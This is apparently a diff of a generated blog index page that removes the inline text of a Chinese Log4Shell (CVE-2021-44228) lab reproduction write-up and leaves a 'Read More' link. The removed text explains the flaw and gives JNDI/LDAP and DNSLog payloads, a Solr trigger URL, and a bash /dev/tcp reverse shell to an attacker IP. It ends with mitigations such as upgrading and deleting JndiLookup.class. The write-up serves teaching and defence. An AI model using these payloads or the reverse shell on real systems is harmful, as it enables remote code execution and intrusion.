@@ -94,196 +94,15 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="Log4j2-CVE-2021-44228-漏洞复现总结"><a href="#Log4j2-CVE-2021-44228-漏洞复现总结" class="headerlink" title="Log4j2 CVE-2021-44228 漏洞复现总结"></a>Log4j2 CVE-2021-44228 漏洞复现总结</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>CVE-2021-44228，又称 <strong>Log4Shell</strong>，是 Apache Log4j2 中的远程代码执行漏洞。</p>
-<p>该漏洞影响 Log4j2 早期版本，典型影响范围为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Log4j2 2.0-beta9 ~ 2.14.1</span><br></pre></td></tr></table></figure>
-
-<p>漏洞本质是：</p>
-<blockquote>
-<p>Log4j2 在记录日志时，会对日志内容中的 <code>${}</code> 表达式进行 Lookup 解析。如果攻击者能够控制被记录进日志的内容，就可以构造 <code>${jndi:ldap://...}</code> 触发 JNDI 查询，进一步导致远程代码执行。</p>
-</blockquote>
-<hr>
-<h2 id="二、Log4j2-Lookup-机制"><a href="#二、Log4j2-Lookup-机制" class="headerlink" title="二、Log4j2 Lookup 机制"></a>二、Log4j2 Lookup 机制</h2><p>Log4j2 支持 Lookup 功能，用于在日志中动态解析变量。</p>
-<p>例如：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:user.home&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会读取 Java 系统属性：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;user.home&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>再例如：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;env:PATH&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会读取环境变量。</p>
-<p>这些功能本身是为了增强日志灵活性，但问题在于 Log4j2 也支持 JNDI Lookup：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://example.com/a&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当该内容进入日志并被 Log4j2 解析时，就会触发 JNDI 查询。</p>
-<hr>
-<h2 id="三、JNDI-与-LDAP-的作用"><a href="#三、JNDI-与-LDAP-的作用" class="headerlink" title="三、JNDI 与 LDAP 的作用"></a>三、JNDI 与 LDAP 的作用</h2><h3 id="1-JNDI-是什么"><a href="#1-JNDI-是什么" class="headerlink" title="1. JNDI 是什么"></a>1. JNDI 是什么</h3><p>JNDI 全称是 <strong>Java Naming and Directory Interface</strong>，即 Java 命名和目录接口。</p>
-<p>它的作用是让 Java 程序可以通过一个名称查找远程对象或资源，例如：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> context.lookup(<span class="string">&quot;ldap://server/object&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-LDAP-是什么"><a href="#2-LDAP-是什么" class="headerlink" title="2. LDAP 是什么"></a>2. LDAP 是什么</h3><p>LDAP 全称是 <strong>Lightweight Directory Access Protocol</strong>，即轻量级目录访问协议。</p>
-<p>在正常场景中，LDAP 常用于查询用户、组织、权限等目录信息。</p>
-<p>在 Log4j2 漏洞利用中，LDAP 被攻击者用作 JNDI 查询的远程服务端：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目标服务器</span><br><span class="line">    |</span><br><span class="line">    | JNDI Lookup</span><br><span class="line">    v</span><br><span class="line">攻击者 LDAP 服务器</span><br></pre></td></tr></table></figure>
-
-<p>攻击者控制 LDAP 服务器返回恶意对象或恶意类的位置，从而诱导目标 Java 程序加载并执行恶意代码。</p>
-<hr>
-<h2 id="四、漏洞触发流程"><a href="#四、漏洞触发流程" class="headerlink" title="四、漏洞触发流程"></a>四、漏洞触发流程</h2><p>攻击者构造 Payload：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://攻击者IP:端口/对象名&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当该 Payload 被应用记录进日志时，触发流程如下：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">用户输入</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">应用程序记录日志</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">Log4j2 解析 $&#123;&#125;</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">发现 jndi:ldap://...</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">调用 JndiLookup.lookup()</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">目标服务器访问攻击者 LDAP 服务</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">LDAP 返回恶意类或恶意对象引用</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">目标加载恶意 class</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">执行恶意代码</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、DNSLog-在漏洞验证中的作用"><a href="#五、DNSLog-在漏洞验证中的作用" class="headerlink" title="五、DNSLog 在漏洞验证中的作用"></a>五、DNSLog 在漏洞验证中的作用</h2><p>DNSLog 是一种外带验证方式，用于判断目标是否触发了外部请求。</p>
-<p>常见 Payload：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.abc123.dnslog.cn/a&#125;</span><br></pre></td></tr></table></figure>
-
-<p>含义如下：</p>
-<ul>
-<li><code>${jndi:ldap://...}</code>：触发 JNDI LDAP 查询；</li>
-<li><code>${sys:java.version}</code>：读取目标 Java 版本；</li>
-<li><code>abc123.dnslog.cn</code>：攻击者控制的 DNSLog 域名。</li>
-</ul>
-<p>如果目标存在漏洞，Log4j2 会先解析 <code>${sys:java.version}</code>，例如得到：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.8.0_292</span><br></pre></td></tr></table></figure>
-
-<p>最终访问：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap://1.8.0_292.abc123.dnslog.cn/a</span><br></pre></td></tr></table></figure>
-
-<p>目标服务器在访问该域名时会产生 DNS 查询，DNSLog 平台记录到请求，即可证明漏洞被触发。</p>
-<p>DNSLog 的作用主要是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">确认漏洞是否触发</span><br><span class="line">确认目标是否能外连</span><br><span class="line">外带获取少量环境信息</span><br></pre></td></tr></table></figure>
-
-<p>但 DNSLog 本身一般不用于完成 RCE。</p>
-<hr>
-<h2 id="六、利用方法总结"><a href="#六、利用方法总结" class="headerlink" title="六、利用方法总结"></a>六、利用方法总结</h2><h3 id="1-DNSLog-验证阶段"><a href="#1-DNSLog-验证阶段" class="headerlink" title="1. DNSLog 验证阶段"></a>1. DNSLog 验证阶段</h3><p>构造 Payload：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://xxx.dnslog.cn/a&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果 DNSLog 平台收到解析记录，说明目标触发了 JNDI 查询。</p>
-<p>该阶段只用于验证，不一定能执行命令。</p>
-<hr>
-<h3 id="2-LDAP-利用阶段"><a href="#2-LDAP-利用阶段" class="headerlink" title="2. LDAP 利用阶段"></a>2. LDAP 利用阶段</h3><p>完整 RCE 需要攻击者搭建 LDAP 服务。</p>
-<p>本次复现中使用的是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulhub/java-chains</span><br></pre></td></tr></table></figure>
-
-<p>Java-Chains 的作用是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提供 LDAP 服务</span><br><span class="line">生成恶意 Java 字节码</span><br><span class="line">返回恶意 Reference</span><br><span class="line">辅助完成命令执行</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-Java-Chains-配置"><a href="#3-Java-Chains-配置" class="headerlink" title="3. Java-Chains 配置"></a>3. Java-Chains 配置</h3><p>在 Java-Chains 中选择：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JNDI</span><br><span class="line">  └── JNDIBasicPayload</span><br><span class="line">        └── BytecodeConvert</span><br><span class="line">              └── Exec</span><br></pre></td></tr></table></figure>
-
-<p>关键配置：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reverse IP: 攻击机 IP</span><br><span class="line">cmd: 要执行的命令</span><br></pre></td></tr></table></figure>
-
-<p>生成 LDAP 地址，例如：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap://172.26.101.44:50389/xxxxxx</span><br></pre></td></tr></table></figure>
-
-<p>最终构造 Log4j2 Payload：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://172.26.101.44:50389/xxxxxx&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="4-Vulhub-Solr-触发方式"><a href="#4-Vulhub-Solr-触发方式" class="headerlink" title="4. Vulhub Solr 触发方式"></a>4. Vulhub Solr 触发方式</h3><p>Vulhub 的 Log4j2 靶场使用 Apache Solr。</p>
-<p>可通过如下接口触发：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://攻击机IP:LDAP端口/对象名&#125;</span><br></pre></td></tr></table></figure>
-
-<p>例如：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://172.26.101.44:50389/xxxxxx&#125;</span><br></pre></td></tr></table></figure>
-
-<p>触发后流程为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Solr 接收请求</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">Log4j2 记录 action 参数</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">解析 $&#123;jndi:ldap://...&#125;</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">访问 Java-Chains LDAP 服务</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">加载恶意字节码</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">执行命令</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="5-命令执行验证"><a href="#5-命令执行验证" class="headerlink" title="5. 命令执行验证"></a>5. 命令执行验证</h3><p>可以先使用简单命令验证：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> /tmp/log4j_success</span><br></pre></td></tr></table></figure>
-
-<p>如果目标容器中成功生成该文件，说明 RCE 已经成功。</p>
-<p>也可以执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> &gt; /tmp/whoami.txt</span><br></pre></td></tr></table></figure>
-
-<p>用于确认执行用户身份。</p>
-<hr>
-<h3 id="6-反弹-Shell"><a href="#6-反弹-Shell" class="headerlink" title="6. 反弹 Shell"></a>6. 反弹 Shell</h3><p>攻击机先监听：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-
-<p>目标执行反弹命令，例如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-
-<p>反弹成功后，攻击机 nc 会收到连接，并获得目标环境的 shell。</p>
-<hr>
-<h2 id="七、漏洞根本原因"><a href="#七、漏洞根本原因" class="headerlink" title="七、漏洞根本原因"></a>七、漏洞根本原因</h2><p>Log4j2 CVE-2021-44228 的根本原因可以概括为：</p>
-<blockquote>
-<p>日志组件对不可信输入进行了表达式解析，并且支持通过 JNDI 访问远程资源，导致攻击者可以控制远程查找地址，进而加载恶意代码。</p>
-</blockquote>
-<p>问题点包括：</p>
-<ol>
-<li>用户输入可控；</li>
-<li>用户输入进入日志；</li>
-<li>Log4j2 对日志内容进行 Lookup 解析；</li>
-<li>JNDI Lookup 支持 LDAP&#x2F;RMI 等远程协议；</li>
-<li>Java 远程类加载或恶意对象处理导致代码执行。</li>
-</ol>
-<hr>
-<h2 id="八、防范措施"><a href="#八、防范措施" class="headerlink" title="八、防范措施"></a>八、防范措施</h2><h3 id="1-升级-Log4j2"><a href="#1-升级-Log4j2" class="headerlink" title="1. 升级 Log4j2"></a>1. 升级 Log4j2</h3><p>最根本的修复方式是升级到安全版本。</p>
-<p>建议升级至：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log4j2 2.17.1 或更高版本</span><br></pre></td></tr></table></figure>
-
-<p>对于 Java 8 及以上环境，应优先升级到官方推荐的安全版本。</p>
-<hr>
-<h3 id="2-检查并修复依赖"><a href="#2-检查并修复依赖" class="headerlink" title="2. 检查并修复依赖"></a>2. 检查并修复依赖</h3><p>重点检查项目中是否存在：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log4j-core</span><br></pre></td></tr></table></figure>
-
-<p>真正受影响的核心组件是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log4j-core</span><br></pre></td></tr></table></figure>
-
-<p>而不仅仅是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log4j-api</span><br></pre></td></tr></table></figure>
-
-<p>在 Maven 项目中可以使用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn dependency:tree | grep log4j</span><br></pre></td></tr></table></figure>
-
-<p>在 Gradle 项目中可以使用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gradle dependencies | grep log4j</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-禁用-JNDI-Lookup"><a href="#3-禁用-JNDI-Lookup" class="headerlink" title="3. 禁用 JNDI Lookup"></a>3. 禁用 JNDI Lookup</h3><p>对于旧版本，可通过配置临时缓解。</p>
-<p>例如 JVM 参数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dlog4j2.formatMsgNoLookups=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>但该方式并不是所有版本都完全可靠，不能替代升级。</p>
-<hr>
-<h3 id="4-删除-JndiLookup-类"><a href="#4-删除-JndiLookup-类" class="headerlink" title="4. 删除 JndiLookup 类"></a>4. 删除 JndiLookup 类</h3><p>可以从 <code>log4j-core.jar</code> 中删除危险类：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
-
-<p>示例命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
-
-<p>该方式可以阻止 <code>${jndi:...}</code> 被解析。</p>
-<hr>
-<h3 id="5-限制服务器外连"><a href="#5-限制服务器外连" class="headerlink" title="5. 限制服务器外连"></a>5. 限制服务器外连</h3><p>攻击链需要目标服务器主动访问攻击者控制的服务。</p>
-<p>因此应限制服务器出站访问：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LDAP</span><br><span class="line">RMI</span><br><span class="line">DNS</span><br><span class="line">HTTP</span><br><span class="line">HTTPS</span><br></pre></td></tr></table></figure>
-
-<p>尤其是限制生产服务器直接访问公网。</p>
-<hr>
-<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>Log4j2 CVE-2021-44228 是一个典型的日志注入到远程代码执行漏洞。</p>
-<p>完整攻击链如下：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">攻击者输入恶意 Payload</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">应用记录日志</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">Log4j2 解析 Lookup</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">触发 JNDI LDAP 查询</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">访问攻击者 LDAP 服务</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">返回恶意 Reference 或字节码地址</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">目标加载恶意 class</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">执行命令或反弹 shell</span><br></pre></td></tr></table></figure>
-
-<p>一句话总结：</p>
-<blockquote>
-<p>Log4j2 漏洞的核心在于：不可信输入进入日志后被 Log4j2 当作表达式解析，攻击者通过 <code>${jndi:ldap://...}</code> 控制 JNDI 查询地址，最终实现远程代码执行。</p>
-</blockquote>
-<p>防护的核心原则是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">升级 Log4j2</span><br><span class="line">移除 JNDI Lookup</span><br><span class="line">检查依赖</span><br><span class="line">限制服务器外连</span><br></pre></td></tr></table></figure>
-
+        
+          <p class="article-more-link">
+            <a href="/2026/07/08/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/08/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cuid1FoSv3KhsQvQEha-j3VHh" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/08/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cuiddF_xNxvmCoswuSE6YUzKM" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -324,7 +143,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/08/dzl-first-blog/" data-id="cuid7pSNkKOYiHVuEkvnyuYg9" data-title="dzl-first-blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/08/dzl-first-blog/" data-id="cuidSHqp3TzjXx2OLUhC1w9eJ" data-title="dzl-first-blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -375,7 +194,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/08/hello-world/" data-id="cuidMAj7_rC-_ADslanbRu16k" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/08/hello-world/" data-id="cuidHwKn0v8cymAKTCTACERMa" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
